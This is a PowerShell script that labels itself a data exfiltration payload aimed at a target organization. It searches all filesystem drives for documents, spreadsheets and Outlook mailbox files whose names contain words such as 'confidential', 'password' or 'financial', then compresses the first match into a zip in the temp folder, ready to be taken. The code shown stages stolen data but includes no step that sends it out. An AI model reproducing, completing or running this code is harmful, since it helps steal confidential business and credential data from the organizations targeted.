
# PowerShell Data Exfiltration Payload for Target Organization
# Generated: 2025-11-03T11:02:43.477660

function Find-SensitiveFiles {
    $extensions = @('.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.csv', '.pst', '.ost')
    $sensitiveKeywords = @('confidential', 'secret', 'classified', 'password', 'financial', 'budget', 'strategy')
    
    $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -ne $null}
    
    foreach ($drive in $drives) {
        try {
            $files = Get-ChildItem -Path $drive.Root -Recurse -Include $extensions -ErrorAction SilentlyContinue | 
                    Where-Object {$_.Length -lt 10MB} | 
                    Select-Object -First 100
            
            foreach ($file in $files) {
                foreach ($keyword in $sensitiveKeywords) {
                    if ($file.Name -like "*$keyword*") {
                        $file | Add-Member -NotePropertyName "KeywordMatch" -NotePropertyValue $keyword
                        return $file
                    }
                }
            }
        } catch { }
    }
    return $null
}

function Compress-And-Prepare {param($filePath)
    $tempZip = "$env:TEMP\target_data.zip"
    Compress-Archive -Path $filePath -DestinationPath $tempZip -Force
    return $tempZip
}

# Find and prepare sensitive files
$sensitiveFile = Find-SensitiveFiles
if ($sensitiveFile) {
    $zipPath = Compress-And-Prepare -filePath $sensitiveFile.FullName
    Write-Host "Sensitive file found and prepared: $($sensitiveFile.FullName)"
} else {
    Write-Host "No sensitive files found matching criteria"
}
